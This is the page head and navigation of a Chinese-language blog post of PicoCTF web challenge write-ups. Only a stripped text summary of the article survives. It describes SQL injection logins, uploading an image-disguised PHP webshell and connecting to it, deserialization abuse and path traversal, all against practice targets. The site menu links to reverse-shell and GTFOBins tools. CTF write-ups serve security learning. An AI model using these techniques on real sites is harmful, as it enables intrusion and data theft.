<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>All-in-One PicoCTF Writeups: Web | S1l3ntC0nquer</title><meta name="keywords" content="Cybersecurity,PicoCTF"><meta name="author" content="S1l3ntC0nquer"><meta name="copyright" content="S1l3ntC0nquer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="All-in-One PicoCTF Writeups: Web"><meta name="application-name" content="All-in-One PicoCTF Writeups: Web"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="All-in-One PicoCTF Writeups: Web"><meta property="og:url" content="https://blog.S1l3ntC0nquer.in/posts/4f98706e/index.html"><meta property="og:site_name" content="S1l3ntC0nquer"><meta property="og:description" content="前言 其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。 自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題"><meta property="og:locale" content="en"><meta property="og:image" content="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta property="article:author" content="S1l3ntC0nquer"><meta property="article:tag" content="S1l3ntC0nquer, XploitOverlord, S1l3ntC0nquer universe, S1l3ntC0nquer Blog, Blog, CTF, S1l3ntC0nquer hacker, hacker, Cybersecurity, Hacker, Hacker, Programming, Programmer, hacker-blog, hacker-blog, Programming Diary, Hacker, hacker-blog, Kalpesh Solanki"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta name="description" content="前言 其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。 自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題"><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://blog.S1l3ntC0nquer.in/posts/4f98706e/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="xxx"><meta name="baidu-site-verification" content="code-xxx"><meta name="msvalidate.01" content="xxx"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload='this.media="all"'><script async src="https://www.googletagmanager.com/gtag/js?id=G-PM5RRNPNEB"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-PM5RRNPNEB")</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron&amp;display=swap" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={linkPageTop:{enable:!0,title:"Connect with others",addFriendPlaceholder:"Nickname：\nSite URL：\nAvatar URL：\nDescription："},peoplecanvas:void 0,postHeadAiDescription:{enable:!0,gptName:"S1l3ntC0nquer",mode:"local",switchBtn:!1,btnLink:"https://afdian.net/item/886a79d4db6711eda42a52540025c377",randomNum:3,basicWordCount:1e3,key:"xxxx",Referer:"https://xx.xx/"},diytitle:void 0,LA51:void 0,greetingBox:void 0,twikooEnvId:"https://comments.S1l3ntC0nquer.in/",commentBarrageConfig:{enable:!0,maxBarrage:1,barrageTime:8e3,accessToken:"8e5a0f02d2d6b6604e700a856bf586e7",mailMd5:"25de757f9696b310771b584e7bf5b238"},root:"/",preloader:{source:3},friends_vue_info:void 0,navMusic:!0,mainTone:{mode:"api",api:"https://img2color.S1l3ntC0nquer.in/api?img=",cover_change:!0},authorStatus:{skills:["Hacker","CTFer","Developer","Programmer",3345]},algolia:void 0,localSearch:{path:"/search.xml",preload:!0,languages:{hits_empty:"We didn't find any results for the search: ${query}"}},translate:{defaultEncoding:1,translateDelay:0,msgToTraditionalChinese:"ૠ",msgToSimplifiedChinese:"ૠ",rightMenuMsgToTraditionalChinese:"Simp / Trad",rightMenuMsgToSimplifiedChinese:"Simp / Trad"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:330},copy:{success:"Copy successfully",error:"Copy error",noSupport:"The browser does not support"},relativeDate:{homepage:!1,simplehomepage:!0,post:!1},runtime:"days",date_suffix:{just:"Just",min:"minutes ago",hour:"hours ago",day:"days ago",month:"months ago"},copyright:{copy:!0,copyrightEbable:!1,limitCount:50,languages:{author:"Author: S1l3ntC0nquer",link:"Link: ",source:"Source: S1l3ntC0nquer",info:"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.",copySuccess:"Copy success, copy and reprint please mark the address of this article"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"Traditional Gujarati Activated Manually",cht_to_chs:"Simplified Gujarati Activated Manually",day_to_night:"Dark Mode Activated Manually",night_to_day:"Light Mode Activated Manually",bgLight:"#425AEF",bgDark:"#1f1f1f",position:"top-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css"}},isPhotoFigcaption:!0,islazyload:!0,isAnchor:!1,shortcutKey:void 0,autoDarkmode:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={configTitle:"S1l3ntC0nquer",title:"All-in-One PicoCTF Writeups: Web",postAI:"",pageFillDescription:"前言, unminify, Includes, picobrowser, SQLiLite, More SQLi, Trickster, Super Serial, Java Code Analysis!?!, IntroToBurp, Forbidden Paths, It is my Birthday, Irish-Name-Repo 1, SOAP, SQL Direct, Cookies, More Cookies, Client-side-again, Some Assembly Required 1前言其實好像也沒什麼好講前言的但就是不想要一開始就是題目分類所以還是放了個前言自己在刷的時候常常發現幾乎所有的都是英文的居多所以想說來寫個完整一點的中文版總之呢這裡就是會盡量彙整所有的的題目在這邊但是因為已經寫了題左右才開始打算來寫所以可能前面的部分會等其他都寫完再來補如果有需要就可以直接來這邊看所有的就這樣啦希望能幫忙到你先看題目點開後他會說如果你打開了這個網頁代表你的瀏覽器已經收到了只是他不知道要怎麼讀取它既然他說了我們瀏覽器已經收到了就打開看一下網頁代碼吧點開開發者工具後直接在的裡面用搜尋字串結果就直接找到了欸不是這題也太水了吧這個題目給了一個網站長下面這樣只有一個東西沒什麼資訊只有這個點了會有一個直接點開先看一下有甚麼或其他東西結果發現了點開看後會發現有半個然後繼續看會發現還有一個有前半部的所以就可以拼出整個啦這題我們點進後會看到一個的按鈕按下去會發現我們不能得到他說我們應該要是所以我就寫了一個的腳本來運行看看能不能拿到這裡把改為這樣就得到了題目是一個登入頁面我們先嘗試用登入看看它會說但是我們可以看到它的查詢語句是所以我們就可以很輕鬆的用啦這邊使用帳號登入就可以啦密碼不用輸入或是隨便輸入也行但是他說在裡面所以我們看不見那就打開開發者工具用搜尋吧把題目了之後會進入到一個登入頁面如下圖然後我們先嘗試使用作為帳號密碼登入帳號密碼都輸入後按下登入網頁會渲染一個我們剛剛輸入的帳號密碼以及後台的使用者資訊的查詢語句如下圖片有點小總之他顯示的內容就是像下面這樣所以我們在這邊把密碼用這串作為輸入帳號可以隨便輸入整個的就會變成這樣可以從上面的代碼高亮的顏色發現在後面的東西都被註解掉了所以就可以直接登入系統啦登入後會看到以下的介面他可以查詢的名稱但其實一筆資料包含了分析一下後台可能的語句應該是如下再來因為題目有告訴我們系統使用的是所以會有一個叫做的表來儲存一些表格的各種資訊資訊來源知道這些候我們輸入讓整個語句變成如下這邊我們使用聯集合併兩個查詢結果因為第一個結果為空集合所以返回的結果就會是的表格內容如下我們可以看到被紅色框框圈住的地方就是我們所想獲得的既然知道表格名稱也知道表格的結構了就把它查詢出來吧使用這段輸入後就可以看到以下的介面啦就找到囉這題的題目是一個可以上傳的網頁看起來就是文件上傳漏洞頁面如下秉持著不知道要幹嘛的時候先掃路徑的精神可以找到它的它其中禁止了兩個路徑如下既然它都禁止了我們就去看看吧應該就是它的上傳後的文件路徑了而它的內容如下所以我們知道後端驗證檔案是否為的方法有二其一為檢查文件後綴名是否為其二為驗證文件的看文件在十六進制中的前幾個位元組是否為知道了這些信息後我們先隨便找一張圖片上傳看看吧我這邊直接隨便截圖並命名為並且在的過程中用去攔截封包並修改其中的檔案名稱及檔案內容這邊把檔案名稱改為並在檔案內容的以下添加這個一句話木馬整個修改完後如下點開來看可能會比較清楚上傳完成後現在這個就會位於這個位置上啦接下來再用中國蟻劍這款工具去連接那個就可以啦連接過程如下連接完成後就可以直接看一下網站的文件看到以下這個應該就是了於是我們就成功找到了啦如下這邊補充一個知識點來講一下到底是在做啥但因為我也不是很熟所以我們來看看大神是怎麼回答的吧當然這段代碼的原理是允許遠程執行伺服器上的代碼這是如何工作的是代碼的開始標記中的函數執行傳遞給它的字符串作為代碼這裡的代碼來自於請求中名為的變量符號用來抑制任何錯誤信息這樣用戶不會看到執行過程中產生的任何錯誤由於這段代碼執行任意代碼它使得伺服器容易受到攻擊因此屬於一種非常危險的做法簡言之任何通過變量傳送的代碼都將被伺服器執行這可以用於各種目的包括但不限於數據讀取文件操作等然後我後來找到了另一篇它的比較酷是一個即時執行的框有興趣可以去看一下這篇這題先讀取發現它有一個禁止的路徑為這似乎代表著它有支持文件所以可以到裡面看它的源代碼為題目說在中所以解題的思路就是要想辦法讀取到先把圖片上的程式碼拿出來分析一下這裡用到了這裡重定向到由於可以透過查看原始代碼所以先去查看和如下如下可以發現在中有以下漏洞這裡的反序列化是不安全的題目名稱也有提示是和有關如果反序列化失敗進入到裡面就會把輸出在裡面的這個類中他定義了就是讀取並回傳的內容所以我們只要建立一個的並輸入錯誤的值就可以觸發反序列化的錯誤下圖中我設置了的值為成功觸發反序列化錯誤的訊息接著我們用來線上寫一些的程式碼這邊會這樣寫是因為我們從中可以看到原始碼是先再最後才反序列化所以整個流程就是反過來就對了他這邊輸出了我們把的值修改為這個試試看能不能正確的輸出成功再來我們只需要一個的並且把他的設定為就可以了如下上面這個代碼執行後會得到這個就是我們最終的啦把它貼到的的並在的頁面重新整理試試看吧這題稍微大一點是一個電子書系統一開始他給了一個登入介面還有一組帳密帳號密碼除此之外也有給源代碼我們先來看看網頁的樣子登入後會看到更多的功能包括閱讀書籍查詢書籍查看帳戶等等登入後的介面如下題目告訴我們這題的是要讀取到的書籍就可以獲得了但是向上圖所看到的我們現在是而這本書只有可以閱讀所以要來想辦法提升權限這題要用到來攔截封包首先先把的攔截給打開接著把打開並連接到題目給的發現是個註冊頁面先亂填一些東西試試填完後按下會發現攔截了我們的封包這邊不用對封包做修改直接按下送過去接著會跳到一個驗證頁面一樣先隨便輸入一些東西接著到裡面修改的數據直接把整行刪掉刪掉後直接把封包送過去就行啦如果只是留空白按還是會發送一個的所以要用直接刪掉就如同題目給的提示一樣題目介紹如下把題目給的網站點開來看長這樣測試一下上面這些檔案後後發現就是一個可以讀檔案的程式既然題目都告訴我們這個網站專案路徑了那就只需要回推回根目錄就可以了因為是有四層那就回去四層前的目錄並讀取就可以了最終如下就跑出來啦如下題目敘述看了敘述後可以發現應該是要上傳兩個具有相同值得文件這邊我們可以直接使用這個裡面的和把這兩個檔案下載下來後上傳到題目的網站就可以了題目敘述所以就是要登入啦先到的頁面看看發現他傳到的參數中有一個如下所以使用打開網頁並修改參數把改為然後請求後會發現傳回來的訊息既然知道他的語句就可以直接啦是順利得到這題根據題目給的提示是一個漏洞我對於沒什麼了解去參考了這篇文章裡面有關於比較詳細的介紹至於這題先用打開去攔截過程中傳送的封包打開後網站後發現點選這三個按鈕都會觸發一個請求我們先隨便點一個讓抓到他的封包我們在進一步修改封包內容長下面這樣因為題目有說要讀取這個路徑所以我們把封包修改一下變成下面這樣把請求之後看到網頁上回傳的內容如下就成功找到啦這題要連接到的資料庫先打開打開後輸入以下命令連接到資料庫密碼為代表代表代表代表資料庫名稱連接到後可以先輸入查看可以看到有一個叫做的表這邊直接用以下命令把資料查詢出來果然看到了打開題目給的網頁後按下並進到裡面查看看到有一個叫做的他的是把他的改為試試看發現頁面變了顯示那把這個一直往上加一直試到就會發現了這題在後可以看到一個很長很亂的他是被混淆處理過的先把它給格式化一下看起來比較舒服最重要的訊息在於函式裡面因為他就是負責檢查登入密碼的那我們要怎麼像是這種東西呢首先我們先把上面這全部的程式碼貼上網頁的然後接著再把變數一個一個輸入進去就可以還原了如下還原後的程式碼如下這樣就可以找到啦打開在看到有一個先把他打開來看看看起來是經過混淆的程式碼先嘗試簡單逆向一下說是逆向其實只是簡單的變數重命名進制轉進制重命名後的代碼像下面這樣在第行的地方我們發現這個自執行的匿名函式會打亂一開始的陣列所以為了搞清楚每個索引對應到的是甚麼我們可以用瀏覽器的來幫忙因為在一開始的代碼裡面從裡面找出其中一個元素的函式叫做所以可以先幫他取個別名叫並像下面這樣輸入在的裡面之後就可以把每個索引帶進去找到對應的字串了那我們就一個一個找回去看看代碼會變怎樣以下是我全部對應完後的代碼這樣我們大概就可以理解這個代碼會把使用者輸入的資訊透過傳給腳本然後呼叫來比對是否正確那我們就先來看看第行的地方他的腳本吧這邊會用到的工具是這個裡面的作者自己的描述是這樣照著官方的安裝說明裝好之後使用以下命令就可以啦記得先用把檔案從抓下來最後一航就可以看到了這邊就不繼續逆向回去想繼續的話一樣可以使用這個工具裡面的其他工具去完成",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-09-01 17:36:47",postMainColor:"#040404"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:(e,t,a)=>{if(0===a)return;const o={value:t,expiry:Date.now()+864e5*a};localStorage.setItem(e,JSON.stringify(o))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const a=JSON.parse(t);if(!(Date.now()>a.expiry))return a.value;localStorage.removeItem(e)}},e.getScript=(e,t={})=>new Promise((a,o)=>{const c=document.createElement("script");c.src=e,c.async=!0,c.onerror=o,c.onload=c.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(c.onload=c.onreadystatechange=null,a())},Object.keys(t).forEach(e=>{c.setAttribute(e,t[e])}),document.head.appendChild(c)}),e.getCSS=(e,t=!1)=>new Promise((a,o)=>{const c=document.createElement("link");c.rel="stylesheet",c.href=e,t&&(c.id=t),c.onerror=o,c.onload=c.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(c.onload=c.onreadystatechange=null,a())},document.head.appendChild(c)}),e.activateDarkMode=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#18171d")},e.activateLightMode=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#f7f9fe")};const t=saveToLocal.get("theme"),a=window.matchMedia("(prefers-color-scheme: dark)").matches,o=window.matchMedia("(prefers-color-scheme: light)").matches,c=window.matchMedia("(prefers-color-scheme: no-preference)").matches,n=!a&&!o&&!c;if(void 0===t){if(o)activateLightMode();else if(a)activateDarkMode();else if(c||n){const e=(new Date).getHours();e<=6||e>=18?activateDarkMode():activateLightMode()}window.matchMedia("(prefers-color-scheme: dark)").addListener(e=>{void 0===saveToLocal.get("theme")&&(e.matches?activateDarkMode():activateLightMode())})}else"light"===t?activateLightMode():activateDarkMode();const d=saveToLocal.get("aside-status");void 0!==d&&("hide"===d?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="S1l3ntC0nquer" data-description="Support me on Buy me a coffee!" data-message="Hackers need COFFEE ☕" data-color="var(--anzhiyu-theme)" data-position="Right" data-x_margin="18" data-y_margin="18"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="S1l3ntC0nquer" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="Loading" src="/assets/me.jpg"><div class="loading-image-dot"></div></div></div><script>const preloader={endLoading:()=>{document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",()=>{preloader.endLoading()}),setTimeout((function(){preloader.endLoading()}),1e4),document.addEventListener("pjax:send",()=>{preloader.initLoading()}),document.addEventListener("pjax:complete",()=>{preloader.endLoading()})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.min.css"><script async src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">Contact</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://x.com/S1l3ntC0nquer" title="X"><img class="back-menu-item-icon" src="/assets/x.png" alt="X"><span class="back-menu-item-text">X</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=" title="Facebook"><img class="back-menu-item-icon" src="/assets/fb.png" alt="Facebook"><span class="back-menu-item-text">Facebook</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><img class="back-menu-item-icon" src="/assets/linkedin.png" alt="LinkedIn"><span class="back-menu-item-text">LinkedIn</span></a><a class="back-menu-item" href="/assets/Resume.pdf" title="Resume"><img class="back-menu-item-icon" src="/assets/me.jpg" alt="Resume"><span class="back-menu-item-text">Resume</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Others</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.in" title="Portfolio"><img class="back-menu-item-icon" src="/assets/me.jpg" alt="Portfolio"><span class="back-menu-item-text">Portfolio</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://admin.S1l3ntC0nquer.in" title="Admin"><img class="back-menu-item-icon" src="/assets/hacker.png" alt="Admin"><span class="back-menu-item-text">Admin</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Useful Tools</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://revshells.S1l3ntC0nquer.in" title="RevShells"><img class="back-menu-item-icon" src="/assets/hacker.png" alt="RevShells"><span class="back-menu-item-text">RevShells</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ohmycv.S1l3ntC0nquer.in" title="OhMyCV"><img class="back-menu-item-icon" src="/assets/hacker.png" alt="OhMyCV"><span class="back-menu-item-text">OhMyCV</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://gtfobins.S1l3ntC0nquer.in" title="GTFOBins"><img class="back-menu-item-icon" src="/assets/hacker.png" alt="GTFOBins"><span class="back-menu-item-text">GTFOBins</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">S1l3ntC0nquer</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="fa-solid fa-file-zipper faa-tada"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="fa-solid fa-icons faa-tada"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="fa-solid fa-hashtag faa-tada"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="fa-solid fa-dice faa-tada"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/assets/Resume.pdf"><i class="fa-solid fa-file faa-tada"></i><span> Resume</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="fa-solid fa-music faa-tada"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/collect/"><i class="fa-solid fa-medal faa-tada"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.notion.site/Bullet-Journal-c79ab73909d94fa387d4b58e85d90494"><i class="fa-solid fa-clipboard-list faa-tada"></i><span> Notes</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="fa-solid fa-id-badge faa-tada"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/subscribe/"><i class="fa-solid fa-bell faa-tada"></i><span> Subscribe</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.in/"><i class="fa-solid fa-user faa-tada"></i><span> Portfolio</span></a></li></ul></div></div></div><div id="nav-right"><div id="nav-naoDark"><div class="container"><div class="components"><div class="main-button"><div class="moon"></div><div class="moon"></div><div class="moon"></div></div><div class="daytime-backgrond"></div><div class="daytime-backgrond"></div><div class="daytime-backgrond"></div><div class="cloud"><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div></div><div class="cloud-light"><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div></div><div class="stars"><div class="star big"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star big"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star medium"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star medium"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star small"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div><div class="star small"><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div><div class="star-son"></div></div></div></div></div></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="Discover a random post" href="javascript:void(0);"><i class="fontawesome fa-solid fa-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="Search🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> Search</span></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://buymeacoffee.com/S1l3ntC0nquer" target="_blank"><img class="post-qr-code-img" alt="Buy Me a Coffee" src="/assets/buymeacoffee.png"></a><div class="post-qr-code-desc">Buy Me a Coffee</div></li><li class="reward-item"><a href="https://blog.S1l3ntC0nquer.in" target="_blank"><img class="post-qr-code-img" alt="S1l3ntC0nquer" src="/assets/me.jpg"></a><div class="post-qr-code-desc">S1l3ntC0nquer</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">Engage</div><span class="author-content-item-title">Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">Points of interest</div><span class="author-content-item-title">Find your area of ​​interest</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI/" style="font-size:1.05rem">AI<sup>1</sup></a><a href="/tags/AIS3/" style="font-size:1.05rem">AIS3<sup>1</sup></a><a href="/tags/Assembly-Code/" style="font-size:1.05rem">Assembly Code<sup>1</sup></a><a href="/tags/Blog/" style="font-size:1.05rem">Blog<sup>1</sup></a><a href="/tags/Byte-Code/" style="font-size:1.05rem">Byte Code<sup>1</sup></a><a href="/tags/CCEP/" style="font-size:1.05rem">CCEP<sup>1</sup></a><a href="/tags/CRT/" style="font-size:1.05rem">CRT<sup>1</sup></a><a href="/tags/CTF/" style="font-size:1.05rem">CTF<sup>33</sup></a><a href="/tags/Crypto/" style="font-size:1.05rem">Crypto<sup>7</sup></a><a href="/tags/Cryptography/" style="font-size:1.05rem">Cryptography<sup>2</sup></a><a href="/tags/CyberSec/" style="font-size:1.05rem">CyberSec<sup>29</sup></a><a href="/tags/GDSC/" style="font-size:1.05rem">GDSC<sup>1</sup></a><a href="/tags/GamePwn/" style="font-size:1.05rem">GamePwn<sup>1</sup></a><a href="/tags/HITCON/" style="font-size:1.05rem">HITCON<sup>1</sup></a><a href="/tags/HTB/" style="font-size:1.05rem">HTB<sup>14</sup></a><a href="/tags/HackTheBox/" style="font-size:1.05rem">HackTheBox<sup>10</sup></a><a href="/tags/Hacker/" style="font-size:1.05rem">Hacker<sup>1</sup></a><a href="/tags/Hacking/" style="font-size:1.05rem">Hacking<sup>1</sup></a><a href="/tags/HacktTheBox/" style="font-size:1.05rem">HacktTheBox<sup>1</sup></a><a href="/tags/Hardware/" style="font-size:1.05rem">Hardware<sup>2</sup></a><a href="/tags/Machine-Code/" style="font-size:1.05rem">Machine Code<sup>1</sup></a><a href="/tags/Math/" style="font-size:1.05rem">Math<sup>2</sup></a><a href="/tags/Misc/" style="font-size:1.05rem">Misc<sup>1</sup></a><a href="/tags/GTU/" style="font-size:1.05rem">GTU<sup>1</sup></a><a href="/tags/PicoCTF/" style="font-size:1.05rem">PicoCTF<sup>13</sup></a><a href="/tags/Pwn/" style="font-size:1.05rem">Pwn<sup>15</sup></a><a href="/tags/Registers/" style="font-size:1.05rem">Registers<sup>1</sup></a><a href="/tags/Reverse/" style="font-size:1.05rem">Reverse<sup>1</sup></a><a href="/tags/SCIST/" style="font-size:1.05rem">SCIST<sup>2</sup></a><a href="/tags/SQLi/" style="font-size:1.05rem">SQLi<sup>1</sup></a><a href="/tags/Security/" style="font-size:1.05rem">Security<sup>1</sup></a><a href="/tags/TechStreak30/" style="font-size:1.05rem">TechStreak30<sup>9</sup></a><a href="/tags/Web/" style="font-size:1.05rem">Web<sup>3</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size:1.05rem">Cryptography<sup>1</sup></a><a href="/tags/%E7%AD%86%E8%A8%98/" style="font-size:1.05rem">Notes<sup>1</sup></a><a href="/tags/%E7%B6%B2%E9%A0%81%E9%96%8B%E7%99%BC/" style="font-size:1.05rem">Web Development<sup>1</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size:1.05rem">Cybersecurity<sup>11</sup></a><a href="/tags/%E9%A7%AD%E5%AE%A2/" style="font-size:1.05rem">Hacker<sup>1</sup></a></div></div><hr></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>Article</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">July 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">26</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a 